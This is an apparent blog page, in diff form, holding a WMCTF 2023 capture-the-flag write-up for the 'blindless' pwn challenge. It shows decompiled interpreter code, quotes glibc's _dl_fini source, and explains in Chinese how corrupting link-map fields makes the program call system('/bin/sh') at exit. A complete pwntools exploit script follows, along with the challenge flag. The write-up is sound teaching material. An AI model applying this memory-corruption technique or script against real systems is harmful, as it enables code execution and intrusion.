@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="{“port”: 10000, “filename”: “blindless_cd248acdcf24111770751e29a19671e7”, “flag”: “flag{a0212a14-6ce3-47fa-9df5-43197ac78186}”} 123456789101112131415161718192021222324252627282930313233343536373839404">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WMCTF2023-blindless">
+<meta property="og:url" content="http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/">
+<meta property="og:site_name" content="YUSHUSU">
+<meta property="og:description" content="{“port”: 10000, “filename”: “blindless_cd248acdcf24111770751e29a19671e7”, “flag”: “flag{a0212a14-6ce3-47fa-9df5-43197ac78186}”} 123456789101112131415161718192021222324252627282930313233343536373839404">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-10-27T14:24:48.000Z">
+<meta property="article:modified_time" content="2023-10-27T14:25:41.863Z">
+<meta property="article:author" content="yushusu">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>WMCTF2023-blindless</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/archives/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/10/27/WMCTF2023-ezAndroid/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&text=WMCTF2023-blindless"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&is_video=false&description=WMCTF2023-blindless"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WMCTF2023-blindless&body=Check out this article: http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&name=WMCTF2023-blindless&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&t=WMCTF2023-blindless"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        WMCTF2023-blindless
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">yushusu</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-10-27T14:24:48.000Z" class="dt-published" itemprop="datePublished">2023-10-27</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>{“port”: 10000, “filename”: “blindless_cd248acdcf24111770751e29a19671e7”, “flag”: “flag{a0212a14-6ce3-47fa-9df5-43197ac78186}”}</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl <span class="title function_">executeBrainfuck</span>(<span class="params">char *code</span>)</span><br><span class="line">&#123;</span><br><span class="line">  struc_1 c; <span class="comment">// [rsp+13h] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  c.<span class="property">field_4</span> = <span class="number">0</span>;</span><br><span class="line">  *&amp;c.<span class="property">key</span> = *code;</span><br><span class="line">  <span class="keyword">while</span> ( *&amp;c.<span class="property">index</span> &lt;= <span class="string">&#x27;\xFF&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( c.<span class="property">key</span> == <span class="string">&#x27;q&#x27;</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( c.<span class="property">key</span> &lt;= <span class="string">&#x27;q&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( c.<span class="property">key</span> == <span class="string">&#x27;@&#x27;</span> )                      </span><br><span class="line">      &#123;</span><br><span class="line">        data += *&amp;code[*&amp;c.<span class="property">index</span> + <span class="number">1</span>];</span><br><span class="line">        *&amp;c.<span class="property">index</span> += <span class="number">5</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( c.<span class="property">key</span> &lt;= <span class="string">&#x27;@&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( c.<span class="property">key</span> == <span class="string">&#x27;&gt;&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ++data;</span><br><span class="line">          ++*&amp;c.<span class="property">index</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ( c.<span class="property">key</span> &lt;= <span class="string">&#x27;&gt;&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( c.<span class="property">key</span> == <span class="string">&#x27;+&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            data += <span class="number">8</span>;</span><br><span class="line">            ++*&amp;c.<span class="property">index</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> ( c.<span class="property">key</span> == <span class="string">&#x27;.&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            *data = code[*&amp;c.<span class="property">index</span> + <span class="number">1</span>];       </span><br><span class="line">            *&amp;c.<span class="property">index</span> += <span class="number">2</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    c.<span class="property">key</span> = code[*&amp;c.<span class="property">index</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>在 ELF 可执行文件中，有一些特定的数据结构用于处理程序的初始化和清理。其中之一是 <code>_dl_fini</code> 函数，它在程序退出之前执行一些清理操作。该函数位于 <code>elf/dl-fini.c</code> 文件中。</p>
+<p>我们可以通过修改 <code>_dl_fini</code> 函数中的数据结构来实现任意函数调用。修改其中的 <code>l-&gt;l_addr</code> （指elf基址） 和 <code>l-&gt;l_info[DT_FINI_ARRAY/DT_FINI]-&gt;d_un.d_ptr</code> 字段，使其ROP到我们需要的函数地址。</p>
+<p>原理类似于 “House of Banana” 攻击，是一种利用堆漏洞的方法。通过修改这些字段可以控制 <code>_dl_fini</code> 函数的行为，并在程序退出时调用我们指定的函数。这种利用方式能够在没有泄露敏感信息的情况下进行任意写操作，且程序能够通过 <code>__libc_start_main</code> 函数正常返回。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[<span class="variable constant_">DT_FINI_ARRAY</span>] != <span class="variable constant_">NULL</span> || l-&gt;l_info[<span class="variable constant_">DT_FINI</span>] != <span class="variable constant_">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (<span class="title function_">GLRO</span>(dl_debug_mask) &amp; <span class="variable constant_">DL_DEBUG_IMPCALLS</span>, <span class="number">0</span>))</span><br><span class="line">        _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">                          <span class="variable constant_">DSO_FILENAME</span> (l-&gt;l_name),</span><br><span class="line">                          ns);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[<span class="variable constant_">DT_FINI_ARRAY</span>] != <span class="variable constant_">NULL</span>) <span class="comment">// 分支1</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">ElfW</span>(<span class="title class_">Addr</span>) *array =</span><br><span class="line">            (<span class="title class_">ElfW</span>(<span class="title class_">Addr</span>) *) (l-&gt;l_addr + l-&gt;l_info[<span class="variable constant_">DT_FINI_ARRAY</span>]-&gt;d_un.<span class="property">d_ptr</span>);</span><br><span class="line">        unsigned int i = (l-&gt;l_info[<span class="variable constant_">DT_FINI_ARRAYSZ</span>]-&gt;d_un.<span class="property">d_val</span> / sizeof (<span class="title class_">ElfW</span>(<span class="title class_">Addr</span>)));</span><br><span class="line">        <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">            ((fini_t) array[i]) ();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Next try the old-style destructor.  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[<span class="variable constant_">DT_FINI</span>] != <span class="variable constant_">NULL</span>) <span class="comment">// 分支2</span></span><br><span class="line">        <span class="variable constant_">DL_CALL_DT_FINI</span> (l, l-&gt;l_addr + l-&gt;l_info[<span class="variable constant_">DT_FINI</span>]-&gt;d_un.<span class="property">d_ptr</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>利用动态链接器（dynamic linker），<code>l_info[DT_FINI]</code>和<code>l_info[DT_INIT]</code>指向不同的地址，分别表示动态链接器在加载共享库时所执行的初始化和终止函数。这些函数在共享库加载时会被调用。通过修改l_info[DT_FINI]的最低字节，使其指向l_info[DT_INIT]，可以实现在程序结束时调用l_info[DT_INIT]指向的初始化函数。利用共享库加载时的初始化函数来实现ROP：</p>
+<ol>
+<li><code>system = elf_base + 0x10E0</code></li>
+<li><code>l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr = 0x1000</code>：这里的<code>l</code>结构体指针包含了动态链接器的相关信息。<code>l-&gt;l_info[DT_INIT]</code>表示动态链接器的初始化函数的入口地址，<code>d_un.d_ptr</code>表示一个无符号指针类型的成员变量。</li>
+<li><code>l-&gt;l_info[DT_FINI]</code>指针覆盖：接下来的目标是通过修改<code>l-&gt;l_info[DT_FINI]</code>的值，使其指向<code>l-&gt;l_info[DT_INIT]</code>。这样在程序结束时，调用<code>l_addr + l-&gt;l_info[DT_FINI].d_un.d_ptr</code>就相当于调用<code>system</code>函数。</li>
+<li><code>l-&gt;l_info[DT_FINI_ARRAY] = 0</code>：将<code>l-&gt;l_info[DT_FINI_ARRAY]</code>设置为0，绕过分支。</li>
+<li><code>rdi = _rtld_global+2312 = &#39;/bin/sh\x00&#39;</code>：将寄存器<code>rdi</code>的值设置为<code>_rtld_global+2312</code>，其实际值是<code>&#39;/bin/sh\x00&#39;</code>，也就是一个以空字符结尾的字符串，表示要执行的命令。</li>
+</ol>
+<p>最后，当程序结束时，会调用<code>l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>，由于前面的修改，这个调用实际上会执行<code>system</code>函数，即执行<code>&#39;/bin/sh\x00&#39;</code>命令。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">pc = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;deepin-terminal&quot;,&quot;-m&quot;,&quot;splitscreen&quot;,&quot;-e&quot;,&quot;bash&quot;,&quot;-c&quot;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(pc,aslr=aslr,env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = [<span class="string">&#x27;1.13.101.243&#x27;</span>, <span class="number">28127</span>]</span><br><span class="line">    p = remote(remote_addr[<span class="number">0</span>], remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> x : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>   : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> x : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> x : p.recv(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s,addr</span>):</span><br><span class="line">    log.critical(<span class="string">&quot;&#123;&#125; -&gt; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(s, <span class="built_in">hex</span>(addr)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(<span class="params">a=<span class="number">6</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(a==<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">return</span> u64(rv(a).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(rl().strip(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">content</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(content)):</span><br><span class="line">        res += <span class="string">&#x27;.&#x27;</span> + content[i] + <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    pause()</span><br><span class="line">    ru(<span class="string">&#x27;size\n&#x27;</span>)</span><br><span class="line">    sn(<span class="built_in">str</span>(<span class="number">0x100000</span>))</span><br><span class="line"></span><br><span class="line">    argv0 = <span class="number">0x325968</span></span><br><span class="line">    l_addr = <span class="number">0x326190</span></span><br><span class="line">    dt_fini = <span class="number">0x326238</span></span><br><span class="line">    dt_fini_array = <span class="number">0x3262a0</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;@&#x27;</span> + p32(argv0-<span class="number">0x10</span>) + write(<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#rdi = _rtld_global+2312 = &#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    l-&gt;l_info[DT_INIT]-&gt;d_un.d_ptr = 0x1000</span></span><br><span class="line"><span class="string">    system = elf_base + 0x10E0</span></span><br><span class="line"><span class="string">    =&gt;</span></span><br><span class="line"><span class="string">    l-&gt;l_addr += 0xE0</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;@&#x27;</span> + p32(l_addr-argv0-<span class="number">8</span>) + write(p8(<span class="number">0xe0</span>))</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    l-&gt;l_info[DT_INIT] = elf_base + 0x3DA8</span></span><br><span class="line"><span class="string">    l-&gt;l_info[DT_FINI] = elf_base + 0x3DB8</span></span><br><span class="line"><span class="string">    =&gt;</span></span><br><span class="line"><span class="string">    l-&gt;l_info[DT_FINI] = l-&gt;l_info[DT_INIT]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload += <span class="string">&#x27;@&#x27;</span> + p32(dt_fini-l_addr-<span class="number">1</span>) + write(p8(<span class="number">0xa8</span>))</span><br><span class="line">    payload += <span class="string">&#x27;@&#x27;</span> + p32(dt_fini_array-dt_fini-<span class="number">1</span>) + write(p64(<span class="number">0</span>)) <span class="comment">#l-&gt;l_info[DT_FINI_ARRAY] = 0</span></span><br><span class="line">    payload += <span class="string">&#x27;q&#x27;</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;size\n&#x27;</span>)</span><br><span class="line">    sn(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    ru(<span class="string">&#x27;code\n&#x27;</span>)</span><br><span class="line">    sn(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/archives/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&text=WMCTF2023-blindless"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&is_video=false&description=WMCTF2023-blindless"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WMCTF2023-blindless&body=Check out this article: http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&title=WMCTF2023-blindless"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&name=WMCTF2023-blindless&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://yushusu.github.io/2023/10/27/WMCTF2023-blindless/&t=WMCTF2023-blindless"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    yushusu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/archives/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/yushusu">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
